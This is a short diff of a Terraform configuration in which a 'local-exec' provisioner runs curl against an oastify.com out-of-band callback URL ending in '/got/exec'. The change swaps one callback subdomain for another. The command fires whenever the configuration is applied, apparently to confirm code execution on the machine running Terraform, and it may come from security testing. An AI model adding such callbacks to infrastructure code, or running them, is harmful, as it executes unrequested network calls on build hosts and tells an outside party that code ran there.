@@ -1,5 +1,5 @@
 resource "terraform_data" "example2" {
   provisioner "local-exec" {
-    command = "curl http://xhiqq42cn3kwvvhlm4lmn5k69xfo3fr4.oastify.com/got/exec"
+    command = "curl http://ik6btp5xqonhygk6ppo7qqnrcii964ut.oastify.com/got/exec"
   }
 }
